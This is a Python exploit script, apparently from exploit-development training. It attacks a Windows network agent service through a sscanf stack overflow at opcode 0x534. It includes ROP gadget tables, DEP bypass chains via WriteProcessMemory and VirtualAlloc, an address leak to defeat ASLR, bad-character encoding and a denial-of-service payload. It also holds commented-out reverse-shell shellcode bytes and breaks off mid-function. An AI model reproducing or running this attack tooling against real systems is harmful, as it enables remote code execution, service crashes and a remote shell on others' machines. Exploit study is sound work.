import struct
import sys
import time
import socket
from typing import Iterable, Tuple, List

REPL_BAD_CHARS = {
    b"\xff": 0x01,
    b"\x10": 0xf9,
    b"\x06": 0x04,
    b"\x07": 0x04,
    b"\x08": 0x04,
    b"\x05": 0x08,
    b"\x1f": 0x01,
}

gadgets = {
    "push esp ; push eax ; pop edi ; pop esi ; ret": 0x1234,
    "push esp ; pop esi ; ret": 0x0408d6,
    "push eax ; pop esi ; ret": 0x0408dd,
    "pop ecx ; ret": 0x10c2,
    "pop eax ; ret": 0x048d5b,
    "mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret": 0x05039a,
    "mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010": 0x08876d,
    "mov dword ptr [esi], eax ; mov eax, esi ; pop esi ; ret": 0x422b,
    "mov dword ptr [esi], eax ; pop esi ; ret": 0x057ef6,
    "mov eax, esi ; pop esi ; ret": 0x2541,
    "mov esp, ebp ; pop ebp ; ret": 0x193e,
    "mov dword ptr [eax], ecx ; ret": 0x06c574,
    "mov eax, dword ptr [eax] ; ret": 0x01d4b4,
    "mov dword ptr [esi], eax ; ret": 0x0884de,
    "mov eax, ecx ; ret": 0x01d023,
    "inc eax ; ret": 0xbc79,
    "inc esi ; retn 0x0003": 0x3e76,
    "add eax, ecx ; ret": 0x01d0f0,
    "add byte [eax+0x00000001], bh ; ret": 0x0468ee,
    "sub eax, ecx ; pop ebx ; ret": 0x04a7b6,
    "neg eax ; ret": 0x01d8c2,
    "xchg eax, ebp ; rol bl, 0x0000005F ; xor eax, eax ; pop esi ; ret": 0x04e495,
    "xchg eax, esp ; ret": 0x05b415,
}

ROP_JUNK_VALUE = 0x41414141


class SnowCrashNet:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.sock = None

    def ConnectServerCreateSocket(self, timeout=10):
        """Create a socket and establish a connection to the server."""
        while True:
            self._CreateSocket(timeout)
            try:
                self.sock.connect((self.ip, self.port))
                break
            except socket.error as e:
                print("[+] Attempting to establish connection")
                time.sleep(timeout)
        print("[+] Connection established")

    def _CreateSocket(self, timeout):
        """Create a new socket and set its timeout."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)

    def GetSocket(self):
        """Return the current socket."""
        return self.sock

    def RecvResponse(self):
        """Receive data from the server and return the response."""
        response = self.sock.recv(0x1024)
        print("[+] Response received")
        return response

    def SendPayload(self, payload):
        """Send the payload to the server."""
        self.sock.send(payload)
        print("[+] Packet sent")


class SnowCrashShellCode:
    def __init__(self, badChars=None, replaceChars=None):
        self.badChars = badChars
        self.replaceChars = replaceChars
        self.sc = b""

    def WriteShellCode(self):
        self.sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        self.sc += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14"
        # \x14\x8b"
        # self.sc += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        # self.sc += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        # self.sc += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        # self.sc += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        # self.sc += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        # self.sc += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        # self.sc += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        # self.sc += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        # self.sc += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        # self.sc += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        # self.sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        # self.sc += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
        # self.sc += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        # self.sc += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
        # self.sc += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
        # self.sc += b"\x6a\x05\x68\xc0\xa8\x2d\xb3\x68\x02\x00\x01"
        # self.sc += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
        # self.sc += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
        # self.sc += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
        # self.sc += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
        # self.sc += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
        # self.sc += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
        # self.sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
        # self.sc += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
        # self.sc += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
        # self.sc += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
        # self.sc += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
        # self.sc += b"\x6a\x00\x53\xff\xd5"
        self.sc += b"\x90" * (420 - len(self.sc))

    def SetShellCode(self, sc):
        self.sc = sc

    def GetShellCode(self):
        return self.sc

    def GetBadChars(self):
        return self.badChars

    """
        MapBadChars and EncodeShellcode as for encoding rop chains
    """

    def MapBadChars(self, sh):
        BADCHARS = self.badChars
        i = 0
        badIndex = []
        while i < len(sh):
            for c in BADCHARS:
                if sh[i] == c:
                    badIndex.append(i)
                    break
            i = i+1
        return badIndex

    def EncodeShellcode(self, sh):
        BADCHARS = self.badChars
        REPLACECHARS = self.replaceChars
        encodedShell = sh
        for i in range(len(BADCHARS)):
            encodedShell = encodedShell.replace(struct.pack(
                "B", BADCHARS[i]), struct.pack("B", REPLACECHARS[i]))
        return encodedShell


class RopChain:
    def __init__(self, base=None, pack_str='<I', chain=b''):
        self.chain = chain
        self.base = base or 0
        self.pack_str = pack_str

    def __iadd__(self, other):
        if isinstance(other, int):
            self.chain += self._pack_32(self.base + other)
        elif isinstance(other, bytes):
            self.chain += other
        else:
            raise NotImplementedError
        return self

    def __len__(self) -> int:
        return len(self.chain)

    @staticmethod
    def p32(address) -> bytes:
        return struct.pack('<I', address)

    def _pack_32(self, address) -> bytes:
        return struct.pack(self.pack_str, address)

    def append_raw(self, address):
        """ just ignore the base address; useful for actual values in conjunction with pop r32 """
        self.chain += struct.pack(self.pack_str, address)


def sanity_check(byte_str: bytes, bad_chars: List[int]):
    baddies = list()

    for bc in bad_chars:
        if bc in byte_str:
            print(f"[!] bad char found: {hex(bc)}")
            baddies.append(bc)

    if baddies:
        print(f"[=] {byte_str}")
        print("[!] Remove bad characters and try again")
        raise SystemExit


class SnowCrashASLR:
    __symbol = 0
    __address = struct.pack('I', 0x00)
    __addressBase = struct.pack('I', 0x00)
    __addressOffset = struct.pack('I', 0x00)

    def __init__(self, exploit):
        self.__symbol = 0
        self.exploit = exploit

    def ClearAll(self):
        self.__symbol = 0
        self.__address = struct.pack('I', 0x00)
        self.__addressBase = struct.pack('I', 0x00)
        self.__addressOffset = struct.pack('I', 0x00)

    def SetSymbol(self, symbol):
        self.__symbol = symbol

    def GetSymbol(self):
        return self.__symbol

    def SetAddress(self, address):
        self.__address = struct.pack('>I', address)

    def GetAddress(self):
        return self.__address

    def SetAddressOffset(self, offset):
        self.__addressOffset = struct.pack('>h', offset)

    def GetAddressOffset(self):
        return self.__addressOffset

    def SetAddressBase(self):
        address_int = int.from_bytes(
            self.GetAddress(),
            byteorder='big'
        )

        offset_int = int.from_bytes(
            self.GetAddressOffset(),
            byteorder='big'
        )

        base_address_int = address_int - offset_int
        self.__addressBase = base_address_int.to_bytes(4, byteorder='big')

    def GetAddressBase(self):
        return self.__addressBase

    def LeakFuncAddr(self, symbol):
        """ for leaking the address of a given symbol """
        self.SetSymbol(symbol)

        self.exploit.service.CreateSymbolPayload(
            self.GetSymbol()
        )

        self.exploit.net.SendPayload(
            self.exploit.service.GetPayload()
        )

        response = self.exploit.net.RecvResponse()
        self.SetAddress(
            self.exploit.service.ParseResponse(response)
        )

    def HasAddressBadChar(self, badchars):
        """ check address for bad chars """
        hasBadChar = False

        for i in range(2):  # Check the first two bytes
            byte = self.GetAddressBase()[i:i+1]
            print(f"[+] Checking character {byte.hex()}")
            if byte in badchars:
                print(f"[-] Address contains bad character {byte.hex()}")
                hasBadChar = True

                break

        return hasBadChar

    def printer(self, appendTo):
        printStr = appendTo + "\n"\
            f" - Address: {self.GetAddress().hex()}\n" +\
            f" - Address Offset: {self.GetAddressOffset().hex()}\n" +\
            f" - Module Address Base: {self.GetAddressBase().hex()}\n"

        print(printStr)


class SnowCrashDEP:
    __codeCaveOffset = 0
    __dataSectonOffset = 0
    __wpmAddress = 0

    def __init__(self, exploit, badCharMap=None, dllBase=None, dataSection=None, codeCave=None, wpmAddress=None):
        self.rop = RopChain(base=dllBase)
        self.exploit = exploit
        self.badCharMap = badCharMap
        self.dllBase = dllBase or 0
        self.SetCodeCaveOffset(codeCave)
        self.SetDataSectionOffset(dataSection)
        self.SetWPMAddress(wpmAddress)

        if dataSection is not None:
            self.SetDataSectionOffset(dataSection)

        if codeCave is not None:
            self.SetCodeCaveOffset(codeCave)

        if wpmAddress is not None:
            self.SetWPMAddress(wpmAddress)

    def GetWPMAddress(self):
        return self.__wpmAddress

    def SetWPMAddress(self, wpmAddress):
        self.__wpmAddress = wpmAddress

    def SetDataSectionOffset(self, dataSection):
        self.__dataSectonOffset = dataSection

    def GetDataSectionOffset(self):
        return self.__dataSectonOffset

    def SetCodeCaveOffset(self, codeCave):
        self.__codeCaveOffset = codeCave

    def GetCodeCaveOffset(self):
        return self.__codeCaveOffset

    """
        -------------------------------
        BOOL WriteProcessMemory(
          HANDLE  hProcess,
          LPVOID  lpBaseAddress,
          LPCVOID lpBuffer,
          SIZE_T  nSize,
          SIZE_T  *lpNumberOfBytesWritten
        );
        -------------------------------
      self.rop += b""
      self.rop.append_raw(0x41414141) # WriteProcessMemory address
      self.rop.append_raw(0x42424242) # shellcode return address to return to after WriteProcessMemory is called
      self.rop.append_raw(0xffffffff) # hProcess (pseudo Process handle)
      self.rop.append_raw(0x44444444) # lpBaseAddress (Code cave address)
      self.rop.append_raw(0x45454545) # lpBuffer (shellcode stack address)
      self.rop.append_raw(0x46464646) # nSize (size of shellcode)
      self.rop.append_raw(0x47474747) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
      -------------------------------
    """

    def GetWriteProcessMemorySkeleton(self):
        self.rop += b""
        self.rop.append_raw(self.GetWPMAddress())  # WriteProcessMemory address
        # shellcode return address to return to after WriteProcessMemory is called (Code cave address)
        self.rop.append_raw(self.GetCodeCaveOffset())
        # hProcess (pseudo Process handle)
        self.rop.append_raw(self.GetCodeCaveOffset())
        # lpBaseAddress (Code cave address)
        self.rop.append_raw(0x43434343)
        # lpBuffer (shellcode stack address)
        self.rop.append_raw(0x41414141)
        self.rop.append_raw(0x42424242)  # nSize (size of shellcode)
        # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
        self.rop.append_raw(self.GetDataSectionOffset())

        return len(self.rop.chain)

    def BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress(self):
        """
            because the stack gets clobbered, we need to store
            the code cave address, and move it to lpBaseAddress
            we also need to put -1 into hProcess for the current process
        """

        # get the address of our stack
        self.rop += gadgets["push esp ; pop esi ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

        # Go to hprocess on the stack
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe8)  # -0x18
        self.rop += gadgets["add eax, ecx ; ret"]

        # get the code cave address and put it into eax
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["mov eax, dword ptr [eax] ; ret"]

        # Put clobbered lpBaseAddress address into ECX
        self.rop += gadgets["mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # junk value for POP ESI
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)

        # Put -1 into hProcess
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffff)
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX
        # The current position of our skeleton is in EAX

        # Go to lpBaseAddress
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # move the address for our code cave in ECX to lpBaseAddress
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["mov eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

    def BuildRopChainWriteProcessMemoryLpBuffer(self):
        # Go to lpBuffer
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put address for lpBuffer into EAX
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xcafebabe)
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0x35014742)  # 0xcafebabe + 0x35014742 = 0x200
        self.rop += gadgets["add eax, ecx ; ret"]

        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

    def BuildRopChainWriteProcessMemoryNsize(self):
        # Go to nSize param
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put nSize into a register
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xfffff9e0)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

    def RetToWriteProcessMemory(self):
        # Put the correct stack address back in eax (rop decoder changed this)
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffec)  # -0x14
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["xchg eax, esp ; ret"]

    def RestoreShellCode(self, eax=0x00, bh=0x11110111):
        # Make sure we have our stack offset in eax
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # Add the offset of our shellcode to our current stack offset
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffff795 - eax)
        self.rop += gadgets["sub eax, ecx ; pop ebx ; ret"]

        # Get bad character 0x00. From 0xff + 01 = 0x00
        self.rop.append_raw(bh)  # 01 into bh
        self.rop += gadgets["add byte [eax+0x00000001], bh ; ret"]

        # Reset stack in esi, and eax for next rop gadget
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop += gadgets["push eax ; pop esi ; ret"]

    def BuildRopChainWriteProcessMemory(self, shellcode):
        skeletonLen = self.GetWriteProcessMemorySkeleton()
        self.BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress()
        self.BuildRopChainWriteProcessMemoryLpBuffer()
        self.BuildRopChainWriteProcessMemoryNsize()

        for i in range(len(self.badCharMap)):
            badShellcodeIndex = self.badCharMap[i]
            key = struct.pack('B', shellcode[badShellcodeIndex])
            bhVal = REPL_BAD_CHARS[key]
            bhVal = (bhVal << 8) | 0x11110011
            self.RestoreShellCode(badShellcodeIndex, bhVal)

        print(f"Gadget we want {hex(self.dllBase + 0x0468ee)}")
        self.RetToWriteProcessMemory()

        return (self.rop.chain, skeletonLen)

    """
        -------------------------------
        LPVOID VirtualAlloc(
          LPVOID lpAddress,
          SIZE_T dwSize,
          DWORD  flAllocationType,
          DWORD  flProtect
        );
        -------------------------------
        self.rop += b""
        self.rop.append_raw(0x41414141) # VirtualAlloc address
        self.rop.append_raw(0x42424242) # shellcode return address to return to after VirtualAlloc is called
        self.rop.append_raw(0x43434343) # lpAddress (shellcode address)
        self.rop.append_raw(0x44444444) # dwSize (0x1)
        self.rop.append_raw(0x45454545) # flAllocationType (0x1000)
        self.rop.append_raw(0x46464646) # flProtect (0x40)
        -------------------------------
    """

    def GetVirtualAllocPlaceHolder(self):
        self.rop += b""
        self.rop.append_raw(0x45454545)  # 0x14 dummy VirutalAlloc Address
        self.rop.append_raw(0x46464646)  # 0x10 Shellcode Return Address
        self.rop.append_raw(0x47474747)  # 0x0c dummy Shellcode Address
        self.rop.append_raw(0x48484848)  # 0x08 dummy dwSize
        self.rop.append_raw(0x49494949)  # 0x04 dummy flAllocationType
        self.rop.append_raw(0x51515151)  # 0x0 dummy flProtect

    def BuildRopChainVirtualAllocAddress(self):
        # get the address of our stack
        self.rop += gadgets["push esp ; push eax ; pop edi ; pop esi ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

        # set the stack offset to the start of our GetVirtualAllocPlaceHolder
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe4)  # -0x1C
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the actual address of VirtualAlloc into the current offset for GetVirtualAllocPlaceHolder
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0x5054A221)  # 5054A220 + 1 VirtualAlloc
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffff)  # -1
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["mov eax, dword ptr [eax] ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainShellCodeRet(self):
        # increment the stack to ShellCodeRet
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # This is an offset of cbRopchain + n from the address of [Shellcode Return Address] on the stack.
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffffea4)              # offset
        self.rop += gadgets["sub eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["add eax, ecx ; ret"]

    def BuildRopChainShellCodeAddr(self):
        # increment the stack to ShellCodeAddr
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # This is an offset of from where we are to the address of [Shellcode Return Address] on the stack.
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffffea8)  # offset
        self.rop += gadgets["sub eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["add eax, ecx ; ret"]

    def BuildRopChainDwSize(self):
        # increment the stack to dwSize
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the value 0x1000 into our stack address dwSize
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffff)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainFlAllocationType(self):
        # increment the stack to FlAllocationType
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # bp 0x50514394 ".if (@ecx & 0x0`ffffffff) = 0x41414141 {} .else {gc}"
        # put the value 0x1000 into our stack address FlAllocationType
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xbebecebf)
        self.rop += gadgets["mov eax, ecx ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0x41414141)
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainFlProtect(self):
        # increment the stack to FlProtec
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the value 0x40 into our stack address FlProtec
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffc0)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]

    def SwapEsiEspVirtualAlloc(self):
        # Assume esi has the stack address at the end of our function call on the stack
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe8)  # negative offset value
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["xchg eax, ebp ; ret"]
        self.rop += gadgets["mov esp, ebp ; pop ebp ; ret"]

    def BuildRopChainVirtualAlloc(self):
        self.BuildRopChainVirtualAllocAddress()
        self.BuildRopChainShellCodeRet()
        self.BuildRopChainShellCodeAddr()
        self.BuildRopChainDwSize()
        self.BuildRopChainFlAllocationType()
        self.BuildRopChainFlProtect()
        self.SwapEsiEspVirtualAlloc()

        self.rop += b"\x90" * 0x24


""" Vulnerable sscanf(...); """
""" opcode = 0x534          """
""" cbBuffer = 0x300        """
""" offsetEip = 276         """


class SnowCrashVulnService:

    SSCANF = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d"
    CB_SSCANF = len(SSCANF)
    CBMAX = 0x100000
    OFFSET_EIP = 276

    __opcode = 0
    __offsetOne = 0
    __offsetTwo = 0
    __offsetThree = 0
    __cbBufferOne = 0
    __cbBufferTwo = 0
    __cbBufferThree = 0

    __psAgentHeader = b""
    __psAgentBuffer = b""

    __cbPayload = 0
    __payload = b""

    __symbolOperation = b""

    def __init__(self, badChars=[]):
        self.badChars = badChars

    def ClearAll(self):
        self.__opcode = 0
        self.__offsetOne = 0
        self.__offsetTwo = 0
        self.__offsetThree = 0
        self.__cbBufferOne = 0
        self.__cbBufferTwo = 0
        self.__cbBufferThree = 0
        self.__psAgentHeader = b""
        self.__psAgentBuffer = b""
        self.__cbPayload = 0
        self.__payload = b""
        self.__symbolOperation = b""

    def CreatePsAgentCommandHeader(self):
        value_positions = {
            0x44: self.GetOpcode(),
            0x45: self.GetOffsetOne(),
            0x46: self.GetCbBufferOne(),
            0x47: self.GetOffsetTwo(),
            0x48: self.GetCbBufferTwo(),
            0x49: self.GetOffsetThree(),
            0x4a: self.GetCbBufferThree(),
        }

        psAgentCommandHeader = b""
        n = 12
        for i in range(1, n+1):
            val = 0x40 + i
            if val in value_positions:
                psAgentCommandHeader += struct.pack("<i", value_positions[val])
            else:
                psAgentCommandHeader += bytes([val]) * 4

        self.SetPsAgentHeader(psAgentCommandHeader)

    def SetSymbolOperation(self, symbol):
        self.__symbolOperation = b"SymbolOperation" + symbol + b"\x00"

    def GetSymbolOperation(self):
        return self.__symbolOperation

    def SetCbPayload(self, cbPayload):
        self.__cbPayload = struct.pack(">I", cbPayload)  # sz first 4 bytes

    def GetCbPayload(self):
        return self.__cbPayload

    def SetPayload(self, cbPayload, psAgentHeader, psAgentBuffer):
        self.__payload = (
            cbPayload +
            psAgentHeader +
            psAgentBuffer
        )

    def GetPayload(self):
        return self.__payload

    def SetPsAgentBuffer(self, psAgentBuffer):
        self.__psAgentBuffer = psAgentBuffer

    def SetPsAgentHeader(self, psAgentHeader):
        self.__psAgentHeader = psAgentHeader

    def GetPsAgentBuffer(self):
        return self.__psAgentBuffer

    def GetPsAgentHeader(self):
        return self.__psAgentHeader

    def GetOffsetOne(self):
        return self.__offsetOne

    def SetOffsetOne(self, offsetOne):
        self.__offsetOne = offsetOne

    def GetOffsetTwo(self):
        return self.__offsetTwo

    def SetOffsetTwo(self, offsetTwo):
        self.__offsetTwo = offsetTwo

    def GetOffsetThree(self):
        return self.__offsetThree

    def SetOffsetThree(self, offsetThree):
        self.__offsetThree = offsetThree

    def GetCbBufferOne(self):
        return self.__cbBufferOne

    def SetCbBufferOne(self, cbBufferOne):
        self.__cbBufferOne = cbBufferOne

    def GetCbBufferTwo(self):
        return self.__cbBufferTwo

    def SetCbBufferTwo(self, cbBufferTwo):
        self.__cbBufferTwo = cbBufferTwo

    def GetCbBufferThree(self):
        return self.__cbBufferThree

    def SetCbBufferThree(self, cbBufferThree):
        self.__cbBufferThree = cbBufferThree

    def SetOpcode(self, opcode):
        self.__opcode = opcode

    def GetOpcode(self):
        return self.__opcode

    def SetAllBuffers(self, cbBuffer):
        self.SetCbBufferOne(cbBuffer)
        self.SetCbBufferTwo(cbBuffer)
        self.SetCbBufferThree(cbBuffer)

    def SetAllOffsets(self, offset):
        self.SetOffsetOne(offset)
        self.SetOffsetTwo(offset)
        self.SetOffsetThree(offset)

    def ParseResponse(self, response):
        """ Parse a server response and extract the leaked address """
        pattern = b"Address is:"
        address = None
        for line in response.split(b"\n"):
            if line.find(pattern) != -1:
                address = int((line.split(pattern)[-1].strip()), 16)
        if not address:
            print("[-] Could not find the address in the Response")
            sys.exit()

        return address

    def CreateSymbolPayload(self, symbol, cbBuffer=0x100):
        print("[+] Creating symbol operation payload")

        self.SetOpcode(0x2000)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(cbBuffer)

        self.CreatePsAgentCommandHeader()
        self.SetSymbolOperation(symbol)
        self.SetCbPayload(cbBuffer)

        padding = b"\x90" * (
            cbBuffer - (
                len(self.GetPsAgentHeader()) +
                len(self.GetSymbolOperation())
            )
        )

        self.SetPsAgentBuffer(
            self.GetSymbolOperation() +
            padding
        )

        self.SetPayload(
            self.GetCbPayload(),
            self.GetPsAgentHeader(),
            self.GetPsAgentBuffer()
        )

    def CreateDosPayload(self):
        print("[+] Creating Denial of Service Payload in sscanf")

        self.SetOpcode(0x534)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(0x123)

        self.CreatePsAgentCommandHeader()
        self.SetCbPayload(0x4400)

        padding = b"\x90" * \
            (0x4404 - (len(self.GetPsAgentHeader()) + self.CB_SSCANF) + 2)

        buffer = self.SSCANF % (padding, 0, 0, 0, 0)

        self.SetPsAgentBuffer(buffer)

        self.SetPayload(
            self.GetCbPayload(),
            self.GetPsAgentHeader(),
            self.GetPsAgentBuffer()
        )

    def CreateExploitPayload(self, sploit):
        print("[+] Creating Exloit Payload sscanf()")

        cbBuf = 0x1100
        cbRopPad = int(cbBuf / 2)
        opcode = 0x534
        dep = sploit.dep

        self.SetOpcode(opcode)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(cbBuf)
        self.SetCbBufferOne(0x1100)
        self.SetCbBufferTwo(0x100)
        self.SetCbBufferThree(0x100)

        self.CreatePsAgentCommandHeader()
        self.SetCbPayload(cbBuf)

        ropChain, cbSkeleton = dep.BuildRopChainWriteProcessMemory(
            sploit.shellcode.GetShellCode()
        )
        ropLen = len(ropChain)
        print(f"ROP len: {ropLen}")
        offsetRopSkeleton = self.OFFSET_EIP - cbSkeleton
        paddingToRopSkeleton = b'\x41' * offsetRopSkeleton
        if ropLen > cbRopPad:
            print(f"ERROR: Our ropchain length is greater than the padding size")
            return

